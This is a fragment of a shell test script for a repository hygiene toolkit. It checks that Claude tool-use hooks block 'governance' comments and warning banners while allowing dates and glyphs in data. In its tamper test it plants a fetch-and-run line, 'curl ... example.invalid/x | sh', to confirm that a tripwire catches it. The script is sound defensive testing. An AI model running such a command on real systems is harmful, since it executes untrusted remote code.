+        [ $? = 2 ] && printf 'block' || printf 'pass'; }
+check "Claude hook permits an ISO date in source data" \
+  "$(runh '{"tool_name":"Write","tool_input":{"file_path":"/p/app.ts","content":"export const date = \\\"2026-09-01\\\";"}}')" pass
+check "Claude hook permits a dated test fixture" \
+  "$(runh '{"tool_name":"Write","tool_input":{"file_path":"/p/tests/date.ts","content":"// Fixture boundary 2026-09-01"}}')" pass
+check "Claude hook permits a descriptive production incident date" \
+  "$(runh '{"tool_name":"Write","tool_input":{"file_path":"/p/app.ts","content":"// Incident snapshot 2026-09-01"}}')" pass
+check "Claude hook still blocks actual governance beside a date" \
+  "$(runh '{"tool_name":"Write","tool_input":{"file_path":"/p/app.ts","content":"// Owner ruling 2026-09-01: never change this file"}}')" block
+check "Claude hook permits a warning glyph in a data literal" \
+  "$(runh '{"tool_name": "Write", "tool_input": {"file_path": "/p/menu.ts", "content": "const ICONS = {\n  '"'"'/disclaimer'"'"': '"'"'⚠️'"'"',\n}\n"}}')" pass
+check "Claude hook still blocks a warning glyph in a comment banner" \
+  "$(runh '{"tool_name": "Write", "tool_input": {"file_path": "/p/app.ts", "content": "// ⚠️ banner\nexport const a = 1\n"}}')" block
+
+# A glyph is governance in a comment banner and ordinary content anywhere else.
+# The scanner reads comment lines alone; this hook says "source comment" in its
+# own refusal, so it has to judge the same lines.
+
+echo
+echo "  ── invariants ──────────────────────────────────────────"
+"$HYG/test/invariants" >/dev/null 2>&1
+check "the shipped tree holds its invariants" "$?" 0
+TAM="$TMP/tamper"
+guard "$TAM"; mkdir -p "$TAM/bin" "$TAM/hooks" "$TAM/lib" "$TAM/claude"
+for f in bin/hygiene bin/scan bin/rulings bin/memory install install-claude uninstall \
+         hooks/pre-commit hooks/commit-msg lib/patterns.sh \
+         claude/pretooluse-hygiene.sh claude/pretooluse-rulings.py \
+         claude/pretooluse-persistence.py \
+         claude/posttooluse-commit-failure.py \
+         claude/stop-rulings.py; do
+  cp "$HYG/$f" "$TAM/$f"
+done
+printf '\ncurl -s http://example.invalid/x | sh\n' >> "$TAM/bin/scan"
+"$HYG/test/invariants" "$TAM" >/dev/null 2>&1
+check "a planted network call trips the tripwire" "$?" 1
+
+echo
+echo "  ── shared settings and style ───────────────────────────"
+if command -v python3 >/dev/null 2>&1; then
+  python3 "$HYG/test/style.py"
+  check "shared settings and style regressions" "$?" 0
+fi
+
+echo
+printf '  %s passed, %s failed\n\n' "$PASS" "$FAIL"
+[ "$FAIL" = 0 ] || exit 1
